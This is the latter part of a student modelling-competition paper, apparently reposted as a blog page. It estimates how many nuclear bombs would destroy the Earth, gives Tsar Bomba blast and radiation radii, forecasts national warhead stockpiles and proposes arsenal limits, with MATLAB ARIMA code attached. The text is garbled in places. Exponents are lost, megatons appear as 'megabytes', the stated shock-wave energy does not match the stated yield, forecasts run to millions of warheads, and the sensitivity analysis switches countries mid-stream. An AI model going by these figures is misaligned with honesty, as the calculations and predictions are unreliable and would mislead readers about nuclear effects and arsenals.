+𝐷<del>𝑜𝑟</del>.According to 𝐷<del>𝑛𝑟</del>, the acute radiation degress grade is obtained.This is shown in Tab.7-2. </p><center>Tab.7-2 acute radiological degress grades </center>| Degree                       | Mild | Moderate | Severe | Extremely severe || ---------------------------- | ---- | -------- | ------ | ---------------- || Nuclear  radiation dose / Gy | 1~2  | 2~4      | 4~6    | \>6              |<p>​        The radiation hazard to the environment can be estimated by the degree of damage to  animals and plants. The maximum radiation dose of human body can only be 100mSv (mSv =  mGy × K, K is the variable coefficient, value is 0.5), and the radiation dose of the smallest TNT equivalent nuclear bomb known in the world is beyond the tolerable range of human beings and unfit for human habitation. lf the natural recovery time after the missile explosion exceeds the earth’s 5 billion years of life, it can also be considered destroyed. </p><h4 id="7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth"><a href="#7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth" class="headerlink" title="7.1.2 um number of nuclear bombs to destroy the Earth"></a>7.1.2 um number of nuclear bombs to destroy the Earth</h4><p>​        The Earth was originally gravitationally collapsed from the remnants of the solar nebula, and to shatter the Earth into a nebula that can no longer be gravitationally held together, the energy produced by the nuclear bomb would need to exceed the gravitational binding energy of the Earth, which the energy required 2.2 × 1032 J. Because 1tTNT = 4.19 × 109 J, so 2.2 × 1032 J is the equivalent of 5.25 × 1022 tTNT, and the number of nuclear bombs in 100 megabytes TNT equivalent is 5.25 × 10^14^. </p><p>​        The number of nuclear bombs in 100-megabyte TNT equivalent needed to blast off the surface of the world is 23.57 × 1012.lf destroying the earth is to make the earth uninhabitable, that is to destroy the living environment of human beings and creatures on the earth. The five conditions for life on Earth are stable sunlight, a safe orbit, suitable temperature, liquid water, and the thickness and composition of the atmosphere. Destroying the atmosphere need 3.2 × 1026J and heating the Earth’s oceans to evaporate and drying out all the land need 7.0 × 1027J . So the number of nuclear bombs in 100-megabyte TNT  equivalent is 1.74 × 1010. </p><h3 id="7-2-Solution-and-analysis-of-b-question"><a href="#7-2-Solution-and-analysis-of-b-question" class="headerlink" title="7.2 Solution and analysis of b question"></a>7.2 Solution and analysis of b question</h3><p>​        “Big Ivan” is the most powerful nuclear bomb known in the world at present, namely the Czar Bomb made in the Soviet era. It is 8m in length, 2.1m in diameter, can weigh up to 27t and has a design TNT equivalent of 100Mt. According to the formula 16 and formula 17, the maximum effective kill radius is 25.55km, resulting in an effective kill area of 2055.05𝑘𝑚^2^,  and the energy of 2.10 × 1013 J released by the shock wave. According to the simulation of nuclear explosion, the altitude of the mushroom cloud is 52.8km, the diameter of the  mushroom cloud head is 204km, and the height of the mushroom cloud head is 11.4km.</p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Dimensions of the mushroom cloud.png" style="zoom:67%;" /><center>Fig.7-1 Dimensions of the mushroom cloud </center>​        The radiation radius（500rem）is 6.99km and the area is about 153km². A 500rem dose of ionizing radiation can be fatal in humans within about 1 month, and 15% of survivors will eventually die of cancer as a result of exposure. The fireball has a radius of 7.92km and an  area of 197km².Damage with the ground depends on the height of the blast. The amount of radioactive fallout increases significantly if the ground is touched. Anything inside the fireball will be effectively vaporized. The heavy blast damager adius(20 psi)is 10.1km and  the area is 321km². <p>​        At 20 psi overpressure, heavy concrete structures were severely damaged or dismantled,  with fatalities approaching 100%.The medium blast damage radius (5 psi) is 21.2 km and the area is 1,420 km².At 5 psi overpressure, most residential buildings collapse with widespread injury and death. The potential for fire in commercial and residential damage is high, and damaged buildings are likely to spread fire. The light burst damage radius (1 psi) is 54.6 km and the area is 9,370 km².At an overpressure of about 1 psi, the glass window may break. The thermal radiation radius(Third degree burns) is 64.2 km and the area is 12,960km².Third  degree burns burn all skin and because of the destruction of painful nerves, are usually  painless, which can lead to severe scarring or disability, and may require amputation. </p><center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Nuclear explosion with southwesterly wind up_1.png" style="zoom:50%;" /><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Nuclear explosion with southwesterly wind up_2.png" style="zoom:50%;" /></center><center>Fig.7-2 Nuclear explosion with southwesterly wind up</center>In 1986, there were 70,300 nuclear weapons on in Earth. Today, the global Arsenal has been reduced by 80 percent, leaving an estimated 12,705 nuclear weapons , which not enough to destroy the planet but enough to destroy 18 percent of its land mass. <h3 id="7-3-Solution-and-Analysis-of-c-Question"><a href="#7-3-Solution-and-Analysis-of-c-Question" class="headerlink" title="7.3. Solution and Analysis of c Question"></a>7.3. Solution and Analysis of c Question</h3><p>​        Since the end of the Cold War, steps have been taken to reduce nuclear arsenals and some progress has been made, but the world’s total stockpile of nuclear warheads remains at a very high level. Today, there are 12,705 nuclear warheads in possession by nine countries.Fig.7-3 shows that 86% of nuclear warheads are owned by Russia and the United States, which have a combined stockpile of 8,185. The number of nuclear warheads needed to protect national security is exaggerated. As Fig.7-4 shows, the total global stockpile of nuclear weapons is declining, but at a slower rate than over the past 30 years. Among them, the United States and Russia are slowly reducing their stockpiles. France’s and Israel’s stockpiles are relatively stable. But China, India, North Korea, Pakistan are adding to their stockpiles. The current nuclear states do not seem to be planning nuclear disarmament, but rather to keep large arsenals indefinitely; All are committed to modernizing their remaining nuclear forces, and all seem committed to retaining nuclear weapons indefinitely, in conflict with the Nuclear Non-Proliferation Treaty. In the short term, it is highly unlikely that the world will achieve a total stockpile of zero nuclear weapons and protect the planet from  nuclear destruction. </p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Ratio of nuclear warheads among nuclearstatesin 2022.png" style="zoom:50%;" /><center>Fig.7-3 Ratio of nuclear warheads among nuclearstatesin 2022 </center><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\Global stockpile of nuclear warheads 1945-2022.png" style="zoom: 60%;" /><center>Fig.7-4 Global stockpile of nuclear warheads 1945-2022 </center>​        In order to protect the earth and the environment on which we depend, we consider limiting the total number of nuclear warheads in the world to 10% of the land damage caused by a nuclear explosion. By calculation, the global stockpile limit is 7,250 nuclear warheads. Countries that already have nuclear weapons are limited to the number of warheads they need to defend their national security. We chose the number of nuclear warheads that could destroy a large nation as the maximum number of nuclear warheads that a nuclear power could possess. By calculation, the limit for nuclear warheads is 487. <h2 id="8-Model-and-solution-of-problem-four"><a href="#8-Model-and-solution-of-problem-four" class="headerlink" title="8 Model and solution of problem four"></a>8 Model and solution of problem four</h2><h3 id="8-1-discovery"><a href="#8-1-discovery" class="headerlink" title="8.1 discovery"></a>8.1 discovery</h3><ol><li><p>Regarding the basic data analysis, we conclude based on the analysis. </p><ul><li>Russia, the United States, China, France, the United Kingdom, Pakistan, India, Israel, North Korea, South Africa and other countries used to have nuclear weapons. </li><li>The United States has the biggest change in its stockpile, with its stockpile dropping by 6,749. </li><li>The largest number of nuclear weapons tests occurred in 1962, 1958, 1968, 1966, 1966 and 1965, with 178, 116, 79, 76 and 71. </li><li>Russia has been the most active in nuclear weapons research over the past decade. </li><li>The United States has made the fastest transition from “not considering nuclear  weapons” to “possessing nuclear weapons.” </li></ul></li><li><p>Predict the number of nuclear weapons </p><ul><li>In 100 years, the country that might have nuclear weapons is Iran. </li><li>China, France, India, Israel, North Korea, Pakistan, Russia, the United Kingdom, the United States and the World. Each have 58, 183, 577, 920, 876, 242, 23938, 618, 4.23864e+006, 21074, 947211, 1.53598e+007 nuclear weapons. </li></ul></li><li><p>Protect our planet </p><ul><li>Destroying the planet requires at least 1.74 × 1010 nuclear bomb. </li><li>Currently nuclear bombs have a maximum effective kill radius of 25.55km, resulting in an effective kill area of 2055.05km2 and the energy released 2.10 × 1013 J by the shock wave; Not enough to destroy the Earth, but it can destroy 18% of the land area. </li><li>To protect our planet, the total global stockpile limit is 7,250 nuclear warheads, and  the nuclear power limit is 487. </li></ul></li></ol><h3 id="8-2-Recommendations"><a href="#8-2-Recommendations" class="headerlink" title="8.2 Recommendations"></a>8.2 Recommendations</h3><p>​        The Earth is our home, and so far, the only planet suitable for human habitation. But nuclear weapons will cause damage to the biological environment of the earth, and the environment destroyed by nuclear weapons is no longer suitable for human habitation. Therefore, here is my advice to the States possessing nuclear weapons: All nuclear- weapon States should refrain from being the first to use nuclear weapons at any time and under any  circumstances, and refrain from using or threatening to use nuclear weapons against non-nuclear-weapon States or nuclear-weapon-free zones. </p><h2 id="9-Sensitivity-analysis-of-the-model"><a href="#9-Sensitivity-analysis-of-the-model" class="headerlink" title="9 Sensitivity analysis of the model"></a>9 Sensitivity analysis of the model</h2><p>​        According to the analysis of the problem, it is known that status will have a great influence on which countries possess nuclear weapons in the next 100 years. In order to test the sensitivity of the model, direct derivation sensitivity analysis is selected for Algeria’s status data. </p><p>​        Use y to represent the status forecast after 100 years, and x to represent the status data  from 1938 to 2022, representing the initial value data y0. And the following relationship is  satisfied. </p><p>$$<br>𝑓(𝑦, 𝑥) = \frac {𝑑𝑥} {𝑑𝑦} , 𝑦(0) = 𝑦^0<br>$$<br>​        Differential equation of sensitivity can be obtained with respect to differentiation X<del>j</del> . </p><p>$$<br>\frac d {dt} \frac {𝜕y} {𝜕x_j}=j  \frac {𝜕y} {𝜕x_j} + \frac {𝜕f} {𝜕x_j} (S=JṠ+F)<br>$$<br>​        The sensitivity formula can be obtained by 𝑆 taking the derivative of pair x<del>j</del> . </p><p>$$<br>S^𝑠 = −𝐽 ^{−1} 𝐹<br>$$<br>​        SPSS was used to make the roc curve of Syria, and the sensitivity graph was as follows. </p><img src="D:\blog\shierjinghuang\source\_posts\2022年美赛数学建模\The sensitivity analysis chart of Syria.png" style="zoom: 67%;" /><center>Fig.9-1The sensitivity analysis chart of Syria </center>## 10 del evaluation <h3 id="10-1-advantages-of-the-model"><a href="#10-1-advantages-of-the-model" class="headerlink" title="10.1 advantages of the model"></a>10.1 advantages of the model</h3><ol><li><p>The entropy weight method can ensure that the index weight is not subject to  subjective influence, so that the results can be carried out according to the calculated weight and the results are more objective. </p></li><li><p>The time series model makes full use of the original data, the calculation speed is fast, the precision is high, and the prediction of the future data is more accurate. </p></li></ol><h3 id="10-2-advantages-of-the-model"><a href="#10-2-advantages-of-the-model" class="headerlink" title="10.2 advantages of the model"></a>10.2 advantages of the model</h3><p>​        This paper only predicts the future development of nuclear weapons in the world and in  each country based on the annual attitudes towards nuclear weapons of all countries from  1938 to now, the annual average stockpile of nuclear weapons of all countries, and the total  number of nuclear-weapon states in the world each year. There may be limitations in the data  of characteristic attributes, which can appropriately increase the world and other influential factors affecting nuclear weapons research. </p><h3 id="10-3-l-Improvement"><a href="#10-3-l-Improvement" class="headerlink" title="10.3 l Improvement"></a>10.3 l Improvement</h3><p>​        All in all, the models established in this paper are consistent with the actual situation and  have certain guidance. At the same time, the models can be analyzed at a deeper level. The  models have high classification accuracy and good generalization performance, and can be applied to the study of the impact of explosive weapons on the environment, the impact of  volcanic eruption on the environment and other fields. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>​        [1] Yang Zhehai. Model Study on the Effect of Terrain on the firing of Indirect Artillery and the  killing efficiency of nuclear Weapons [D]. PLA Information Engineering University, 2001. </p><p>​        [2] Zou Shiya, Zhang Wenzhong, Mao Yongze. Mathematical model of battlefield target damage effect of neutron bomb explosion [J]. Nuclear Electronics and Detection Technology, 2006(02): 132-136. </p><p>​        [3] LIU Tong. Research on Kill Power Evaluation Method of Air Defense Warhead [D]. Nanjing  University of Science and Technology, 2004.Team E apmcm2206077 </p><h2 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h2><h3 id="Attachment-1"><a href="#Attachment-1" class="headerlink" title="Attachment 1"></a>Attachment 1</h3><h4 id="Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）"><a href="#Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）" class="headerlink" title="Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）"></a>Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）</h4><h3 id="Attachment-2"><a href="#Attachment-2" class="headerlink" title="Attachment 2"></a>Attachment 2</h3><h4 id="code-1-Time-prediction-model"><a href="#code-1-Time-prediction-model" class="headerlink" title="code 1: Time prediction model"></a>code 1: Time prediction model</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">)</span> <span class="token function">plot</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data1<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'First-order differential of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">)</span> data2 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data2<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span><span class="token comment">%Set the label  </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Second-order difference of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">%Test the data  </span><span class="token function">kpsstest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  d1_adf <span class="token operator">=</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span> d1_kpss <span class="token operator">=</span> <span class="token function">kpsstest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span>  figure <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>  <span class="token function">autocorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'ACF'</span><span class="token punctuation">)</span> <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span> <span class="token function">parcorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'PACF'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  pm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> qm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> d <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">%[p q ]=findPQ(data,pm,qm,d);%Find the functions of p and q  </span>p <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>q <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">% Model start construction </span>Mdl <span class="token operator">=</span> <span class="token function">arima</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span> EstMdl <span class="token operator">=</span> <span class="token function">estimate</span><span class="token punctuation">(</span>Mdl<span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  step <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>forData<span class="token punctuation">,</span>YMSE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">forecast</span><span class="token punctuation">(</span>EstMdl<span class="token punctuation">,</span>step<span class="token punctuation">,</span><span class="token string">'Y0'</span><span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  l <span class="token operator">=</span> forData <span class="token operator">-</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span>Team E apmcm2206077 Page <span class="token number">23</span> of <span class="token number">24</span> u <span class="token operator">=</span> forData <span class="token operator">+</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Here is the confidence interval of 95  </span>figure <span class="token function">plot</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>forData<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>l<span class="token punctuation">)</span>  <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>u<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles"><a href="#code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles" class="headerlink" title="code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles"></a>code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token comment">%xData on the axis, the first value represents the start of the data, the second value represents the interval, and the third value represents the termination  </span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">270</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%a data y value  CHN </span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%b data y value  FRA </span>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%IND  </span>d<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ISR </span>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PRK  </span>f<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PAK  </span>g<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10114</span><span class="token punctuation">,</span><span class="token number">9076</span><span class="token punctuation">,</span><span class="token number">8038</span><span class="token punctuation">,</span><span class="token number">7000</span><span class="token punctuation">,</span><span class="token number">6643</span><span class="token punctuation">,</span><span class="token number">6286</span><span class="token punctuation">,</span><span class="token number">5929</span><span class="token punctuation">,</span><span class="token number">5527</span><span class="token punctuation">,</span><span class="token number">5215</span><span class="token punctuation">,</span><span class="token number">4858</span><span class="token punctuation">,</span><span class="token number">4750</span><span class="token punctuation">,</span><span class="token number">4650</span><span class="token punctuation">,</span><span class="token number">4600</span><span class="token punctuation">,</span><span class="token number">4500</span><span class="token punctuation">,</span><span class="token number">4490</span><span class="token punctuation">,</span><span class="token number">4300</span><span class="token punctuation">,</span><span class="token number">4350</span><span class="token punctuation">,</span><span class="token number">4330</span><span class="token punctuation">,</span><span class="token number">4310</span><span class="token punctuation">,</span><span class="token number">4495</span><span class="token punctuation">,</span><span class="token number">4477</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%RUS </span>h<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ZAF  </span><span class="token number">i</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token 